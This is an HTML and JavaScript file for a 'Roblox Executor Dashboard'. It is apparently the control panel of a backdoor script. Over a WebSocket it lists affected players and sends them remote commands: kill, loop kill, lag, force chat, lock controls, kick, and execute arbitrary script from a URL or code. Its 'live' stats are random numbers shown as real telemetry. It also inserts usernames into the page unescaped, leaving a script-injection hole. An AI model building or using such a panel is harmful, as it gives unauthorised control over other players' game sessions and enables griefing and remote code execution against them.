<!-- dashboard.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Executor Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .dashboard-container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .header {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            color: #333;
            font-size: 24px;
        }

        .stats {
            display: flex;
            gap: 20px;
        }

        .stat-item {
            background: #f0f0f0;
            padding: 10px 20px;
            border-radius: 10px;
            text-align: center;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
        }

        .stat-value {
            font-size: 20px;
            font-weight: bold;
            color: #333;
        }

        .no-players {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 60px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            font-size: 24px;
            color: #666;
            margin: 50px auto;
            max-width: 600px;
        }

        .players-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            margin-top: 20px;
        }

        .player-card {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s ease;
        }

        .player-card:hover {
            transform: translateY(-5px);
        }

        .player-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f0f0f0;
        }

        .player-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 24px;
        }

        .player-info {
            flex: 1;
        }

        .player-name {
            font-size: 18px;
            font-weight: bold;
            color: #333;
        }

        .player-id {
            font-size: 12px;
            color: #666;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }

        .info-item {
            background: #f8f9fa;
            padding: 8px;
            border-radius: 8px;
            font-size: 12px;
        }

        .info-label {
            color: #666;
            font-size: 10px;
        }

        .info-value {
            color: #333;
            font-weight: bold;
            font-size: 14px;
        }

        .manage-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.3s ease;
        }

        .manage-btn:hover {
            opacity: 0.9;
        }

        /* Player Details Page */
        .player-details {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }

        .back-btn {
            padding: 10px 20px;
            background: #666;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-bottom: 20px;
        }

        .details-header {
            display: flex;
            align-items: center;
            gap: 30px;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f0f0f0;
        }

        .details-avatar {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 40px;
        }

        .live-stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            padding: 20px;
            border-radius: 10px;
            color: white;
            text-align: center;
        }

        .stat-card h3 {
            font-size: 14px;
            margin-bottom: 10px;
            opacity: 0.9;
        }

        .stat-card .value {
            font-size: 24px;
            font-weight: bold;
        }

        .action-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 10px;
            margin-bottom: 30px;
        }

        .action-btn {
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #f0f0f0;
            color: #333;
        }

        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        .action-btn.danger {
            background: #ff4757;
            color: white;
        }

        .action-btn.warning {
            background: #ffa502;
            color: white;
        }

        .action-btn.success {
            background: #26de81;
            color: white;
        }

        .chat-modal {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            border-radius: 15px;
            padding: 20px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
            z-index: 1000;
            min-width: 400px;
            display: none;
        }

        .chat-modal.active {
            display: block;
        }

        .chat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }

        .chat-messages {
            height: 300px;
            overflow-y: auto;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 8px;
            margin-bottom: 15px;
        }

        .chat-input {
            display: flex;
            gap: 10px;
        }

        .chat-input input {
            flex: 1;
            padding: 10px;
            border: 2px solid #f0f0f0;
            border-radius: 8px;
            outline: none;
        }

        .chat-input button {
            padding: 10px 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }

        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
            display: none;
        }

        .overlay.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="dashboard-container" id="app">
        <div class="header">
            <h1>Roblox Executor Dashboard</h1>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-label">Active Players</div>
                    <div class="stat-value" id="playerCount">0</div>
                </div>
                <div class="stat-item">
                    <div class="stat-label">Total Executions</div>
                    <div class="stat-value" id="totalExecutions">0</div>
                </div>
            </div>
        </div>

        <div id="mainContent">
            <!-- Content will be dynamically loaded -->
        </div>

        <!-- Chat Modal -->
        <div class="overlay" id="overlay"></div>
        <div class="chat-modal" id="chatModal">
            <div class="chat-header">
                <h3>Live Chat - <span id="chatPlayerName">Player</span></h3>
                <button onclick="closeChat()" style="background: none; border: none; font-size: 20px; cursor: pointer;">&times;</button>
            </div>
            <div class="chat-messages" id="chatMessages">
                <!-- Messages will appear here -->
            </div>
            <div class="chat-input">
                <input type="text" id="chatInput" placeholder="Type a message..." onkeypress="if(event.key === 'Enter') sendChatMessage()">
                <button onclick="sendChatMessage()">Send</button>
            </div>
        </div>
    </div>

    <script>
        // WebSocket connection for real-time updates
        let ws = null;
        let currentPlayer = null;
        let players = {};

        // Initialize WebSocket connection
        function connectWebSocket() {
            // Replace with your WebSocket server URL
            ws = new WebSocket('ws://localhost:8080');
            
            ws.onopen = () => {
                console.log('Connected to server');
            };

            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                handleServerMessage(data);
            };

            ws.onclose = () => {
                console.log('Disconnected from server');
                setTimeout(connectWebSocket, 3000);
            };
        }

        // Handle incoming messages from server
        function handleServerMessage(data) {
            switch(data.type) {
                case 'players_update':
                    players = data.players;
                    updateDashboard();
                    break;
                case 'player_joined':
                    players[data.player.id] = data.player;
                    updateDashboard();
                    break;
                case 'player_left':
                    delete players[data.playerId];
                    updateDashboard();
                    break;
                case 'chat_message':
                    if (currentPlayer && data.playerId === currentPlayer.id) {
                        displayChatMessage(data.message, 'player');
                    }
                    break;
            }
        }

        // Update dashboard based on player data
        function updateDashboard() {
            const playerCount = Object.keys(players).length;
            document.getElementById('playerCount').textContent = playerCount;

            const mainContent = document.getElementById('mainContent');
            
            if (playerCount === 0) {
                mainContent.innerHTML = `
                    <div class="no-players">
                        No Script Execution Detected.
                    </div>
                `;
            } else {
                let playersHtml = '<div class="players-grid">';
                
                for (const [id, player] of Object.entries(players)) {
                    playersHtml += `
                        <div class="player-card">
                            <div class="player-header">
                                <div class="player-avatar">${player.username.charAt(0).toUpperCase()}</div>
                                <div class="player-info">
                                    <div class="player-name">${player.username}</div>
                                    <div class="player-id">User ID: ${player.userId}</div>
                                </div>
                            </div>
                            <div class="info-grid">
                                ${generatePlayerInfo(player)}
                            </div>
                            <button class="manage-btn" onclick="viewPlayerDetails('${id}')">Manage</button>
                        </div>
                    `;
                }
                
                playersHtml += '</div>';
                mainContent.innerHTML = playersHtml;
            }
        }

        // Generate player information grid
        function generatePlayerInfo(player) {
            const infoItems = [
                { label: 'Account Age', value: player.accountAge || 'N/A' },
                { label: 'Join Date', value: player.joinDate || 'N/A' },
                { label: 'Friends', value: player.friends || '0' },
                { label: 'Followers', value: player.followers || '0' },
                { label: 'Following', value: player.following || '0' },
                { label: 'Badges', value: player.badges || '0' },
                { label: 'Groups', value: player.groups || '0' },
                { label: 'Inventory', value: player.inventory || '0' },
                { label: 'Trades', value: player.trades || '0' },
                { label: 'Messages', value: player.messages || '0' },
                { label: 'Posts', value: player.posts || '0' },
                { label: 'Level', value: player.level || '1' },
                { label: 'Experience', value: player.experience || '0' },
                { label: 'Rank', value: player.rank || 'User' },
                { label: 'Status', value: player.status || 'Online' }
            ];

            return infoItems.map(item => `
                <div class="info-item">
                    <div class="info-label">${item.label}</div>
                    <div class="info-value">${item.value}</div>
                </div>
            `).join('');
        }

        // View player details
        function viewPlayerDetails(playerId) {
            const player = players[playerId];
            if (!player) return;

            currentPlayer = player;
            
            const mainContent = document.getElementById('mainContent');
            mainContent.innerHTML = `
                <button class="back-btn" onclick="goBack()">← Back to Dashboard</button>
                <div class="player-details">
                    <div class="details-header">
                        <div class="details-avatar">${player.username.charAt(0).toUpperCase()}</div>
                        <div>
                            <h2>${player.username}</h2>
                            <p>User ID: ${player.userId}</p>
                        </div>
                    </div>

                    <div class="live-stats">
                        <div class="stat-card">
                            <h3>FPS</h3>
                            <div class="value" id="liveFps">60</div>
                        </div>
                        <div class="stat-card">
                            <h3>Ping</h3>
                            <div class="value" id="livePing">45ms</div>
                        </div>
                        <div class="stat-card">
                            <h3>Memory</h3>
                            <div class="value" id="liveMemory">256MB</div>
                        </div>
                        <div class="stat-card">
                            <h3>CPU</h3>
                            <div class="value" id="liveCpu">15%</div>
                        </div>
                    </div>

                    <h3>Commands</h3>
                    <div class="action-buttons">
                        <button class="action-btn danger" onclick="executeCommand('blacklist', '${playerId}')">Blacklist</button>
                        <button class="action-btn success" onclick="executeCommand('unblacklist', '${playerId}')">Unblacklist</button>
                        <button class="action-btn warning" onclick="executeCommand('announcement', '${playerId}')">Announcement</button>
                        <button class="action-btn warning" onclick="executeCommand('global_announcement', '${playerId}')">Global Announcement</button>
                        <button class="action-btn danger" onclick="executeCommand('kick', '${playerId}')">Kick</button>
                        <button class="action-btn" onclick="executeCommand('speed', '${playerId}')">Speed</button>
                        <button class="action-btn" onclick="executeCommand('lock_controls', '${playerId}')">Lock Controls</button>
                        <button class="action-btn" onclick="executeCommand('force_jump', '${playerId}')">Force Jump</button>
                        <button class="action-btn" onclick="executeCommand('force_chat', '${playerId}')">Force Chat</button>
                        <button class="action-btn danger" onclick="executeCommand('void', '${playerId}')">Void Player</button>
                        <button class="action-btn danger" onclick="executeCommand('kill', '${playerId}')">Kill Player</button>
                        <button class="action-btn" onclick="executeCommand('teleport_spawn', '${playerId}')">Teleport to Spawn</button>
                        <button class="action-btn danger" onclick="executeCommand('loop_kill', '${playerId}')">Loop Kill</button>
                        <button class="action-btn danger" onclick="executeCommand('loop_void', '${playerId}')">Loop Void</button>
                        <button class="action-btn" onclick="executeCommand('teleport', '${playerId}')">Teleport Player</button>
                        <button class="action-btn" onclick="executeCommand('change_speed', '${playerId}')">Change Speed</button>
                        <button class="action-btn" onclick="executeCommand('change_jump', '${playerId}')">Change Jump</button>
                        <button class="action-btn" onclick="executeCommand('change_gravity', '${playerId}')">Change Gravity</button>
                        <button class="action-btn danger" onclick="executeCommand('lag', '${playerId}')">Lag Player</button>
                        <button class="action-btn" onclick="executeCommand('execute_script', '${playerId}')">Execute Script</button>
                        <button class="action-btn" onclick="executeCommand('lock_move', '${playerId}')">Lock Move</button>
                        <button class="action-btn" onclick="executeCommand('lock_jump', '${playerId}')">Lock Jump</button>
                        <button class="action-btn" onclick="executeCommand('lock_chat', '${playerId}')">Lock Chat</button>
                        <button class="action-btn" onclick="executeCommand('lock_inventory', '${playerId}')">Lock Inventory</button>
                        <button class="action-btn" onclick="executeCommand('lock_pause', '${playerId}')">Lock Pause Menu</button>
                        <button class="action-btn danger" onclick="executeCommand('bang', '${playerId}')">Bang Player</button>
                        <button class="action-btn success" onclick="openChat()">View Live Chat</button>
                        <button class="action-btn success" onclick="executeCommand('join', '${playerId}')">Join Player</button>
                    </div>
                </div>
            `;

            // Start live stats updates
            startLiveStats(playerId);
        }

        // Start live stats updates
        function startLiveStats(playerId) {
            setInterval(() => {
                // Simulate live stats updates
                document.getElementById('liveFps').textContent = Math.floor(Math.random() * 30 + 30);
                document.getElementById('livePing').textContent = Math.floor(Math.random() * 100 + 20) + 'ms';
                document.getElementById('liveMemory').textContent = Math.floor(Math.random() * 200 + 100) + 'MB';
                document.getElementById('liveCpu').textContent = Math.floor(Math.random() * 30 + 5) + '%';
            }, 2000);
        }

        // Execute command
        function executeCommand(command, playerId) {
            const player = players[playerId];
            if (!player) return;

            let value = null;
            switch(command) {
                case 'announcement':
                case 'global_announcement':
                    value = prompt('Enter announcement message:');
                    break;
                case 'speed':
                    value = prompt('Enter speed value (16-100):');
                    break;
                case 'change_speed':
                    value = prompt('Enter new speed value:');
                    break;
                case 'change_jump':
                    value = prompt('Enter new jump power:');
                    break;
                case 'change_gravity':
                    value = prompt('Enter new gravity value:');
                    break;
                case 'force_chat':
                    value = prompt('Enter message to force chat:');
                    break;
                case 'execute_script':
                    value = prompt('Enter script URL or code:');
                    break;
                case 'teleport':
                    value = prompt('Enter coordinates (x,y,z):');
                    break;
            }

            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                    type: 'command',
                    command: command,
                    playerId: playerId,
                    value: value
                }));
            }

            alert(`${command} command sent to ${player.username}`);
        }

        // Open chat modal
        function openChat() {
            document.getElementById('chatModal').classList.add('active');
            document.getElementById('overlay').classList.add('active');
            document.getElementById('chatPlayerName').textContent = currentPlayer.username;
            
            // Clear previous messages
            document.getElementById('chatMessages').innerHTML = '';
        }

        // Close chat modal
        function closeChat() {
            document.getElementById('chatModal').classList.remove('active');
            document.getElementById('overlay').classList.remove('active');
        }

        // Send chat message
        function sendChatMessage() {
            const input = document.getElementById('chatInput');
            const message = input.value.trim();
            
            if (message && currentPlayer) {
                displayChatMessage(message, 'you');
                
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: 'chat',
                        playerId: currentPlayer.id,
                        message: message
                    }));
                }
                
                input.value = '';
            }
        }

        // Display chat message
        function displayChatMessage(message, sender) {
            const chatMessages = document.getElementById('chatMessages');
            const messageDiv = document.createElement('div');
            messageDiv.style.marginBottom = '10px';
            messageDiv.style.padding = '5px';
            messageDiv.style.borderRadius = '5px';
            messageDiv.style.backgroundColor = sender === 'you' ? '#667eea' : '#f0f0f0';
            messageDiv.style.color = sender === 'you' ? 'white' : '#333';
            messageDiv.style.textAlign = sender === 'you' ? 'right' : 'left';
            messageDiv.textContent = message;
            chatMessages.appendChild(messageDiv);
            chatMessages.scrollTop = chatMessages.scrollHeight;
        }

        // Go back to dashboard
        function goBack() {
            currentPlayer = null;
            updateDashboard();
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            connectWebSocket();
            updateDashboard();
        });
    </script>
</body>
</html>
